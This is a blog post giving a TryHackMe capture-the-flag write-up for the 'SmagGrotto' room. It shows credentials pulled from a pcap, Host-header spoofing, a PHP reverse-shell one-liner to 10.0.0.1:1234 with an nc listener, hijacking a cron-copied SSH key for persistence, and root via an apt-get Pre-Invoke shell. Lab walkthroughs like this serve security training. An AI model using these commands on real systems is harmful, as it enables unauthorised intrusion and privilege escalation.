---
layout: post
title: SmagGrotto
date:   2025-10-05 11:05
description: TryHackMe CTF Write-Up
tags: tryhackme pgp
comments: false
---
-TRYHACKME CTF WRITEUP-
<br>
<br>
![img]({{ '/assets/images/smag/smag.png' | relative_url }}){: .center-image }
[Link to CTF](https://tryhackme.com/room/smaggrotto)

<br>
<br>
<br>
## Running Nmap we see:
![img]({{ '/assets/images/smag/1-smag.png' | relative_url }}){: .center-image }
<br>

## Enumerating the directories we can see:
![img]({{ '/assets/images/smag/2-smag.png' | relative_url }}){: .center-image }
<br>


## Navigating to the /mail directory on the webpage
## There is a pcap file that we can download and open in Wireshark
![img]({{ '/assets/images/smag/2-smag.png' | relative_url }}){: .center-image }


## If we follow the tcp stream in wireshark, we get a username and password
![img]({{ '/assets/images/smag/3-smag.png' | relative_url }}){: .center-image }

## Alternately we can use 'wget' to download the attachment and 'cat' to read it
![img]({{ '/assets/images/smag/4-smag.png' | relative_url }}){: .center-image }    
.hoverblur {
filter: blur(8px);
transition: filter 0.2s ease;
}
username=helpdesk&password=cH4nG3M3_n0w</p>
.hoverblur:hover {
filter: blur(0);
}
<br>


## We can see Username & Password, but also:
{% highlight bash %}
POST path is: /login.php
Host is: development.smag.thm
{% endhighlight bash %}
<br>

## Lets navigate to /login.php
## But first we will capture and modify the HOST in burpsuite for each subsequent request:
![img]({{ '/assets/images/smag/5-smag.png' | relative_url }}){: .center-image }


## Sending the request we now get the login page
## Let's login with the credentials found in the pcap file
![img]({{ '/assets/images/smag/5.5-smag.png' | relative_url }}){: .center-image }
<br>

## We get a page that allows us to enter commands
![img]({{ '/assets/images/smag/6-smag.png' | relative_url }}){: .center-image }


## Since the page is php, we will use a php reverse shell
## [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
<br>

{% highlight bash %}
We start our listener:
nc -lvnp <port>

Then we enter the following in the command box:
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
{% endhighlight bash %}
![img]({{ '/assets/images/smag/7-smag.png' | relative_url }}){: .center-image }
<br>

## We get a reverse shell back to our machine shortly
![img]({{ '/assets/images/smag/8-smag.png' | relative_url }}){: .center-image }
<br>

## Looking in the home directory we see the user "jake"
## But the we are denied permission to read the user flag
![img]({{ '/assets/images/smag/9-smag.png' | relative_url }}){: .center-image }


## looking at the cron jobs we see:
{% highlight bash %}
/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
{% endhighlight bash %}
![img]({{ '/assets/images/smag/10-smag.png' | relative_url }}){: .center-image }


## Moving to this directory we see jakes publc id_rsa key
## This file has the read and write permissions enabled for all users
![img]({{ '/assets/images/smag/11-smag.png' | relative_url }}){: .center-image }
<br>

## We will write in our public rsa key instead
{% highlight bash %}
echo "your_public_id_rsa_key" > jake_id_rsa.pub.backup
{% endhighlight bash %}
<br>

## We are now able to ssh in as jake
![img]({{ '/assets/images/smag/12-smag.png' | relative_url }}){: .center-image }
<br>

## We can now capture the user flag
![img]({{ '/assets/images/smag/13-smag.png' | relative_url }}){: .center-image }
<br>
<br>
<br>

# Priv Esc
<br>
<br>

## Running sudo-l we see:
![img]({{ '/assets/images/smag/14-smag.png' | relative_url }}){: .center-image }
<br>

## [GTFObins](https://gtfobins.github.io/gtfobins/apt-get/#sudo) shows:
## We can run the command below:
{% highlight bash %}
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
{% endhighlight bash %}
<br>

## We now get root and can capture the root flag !
![img]({{ '/assets/images/smag/15-smag.png' | relative_url }}){: .center-image }
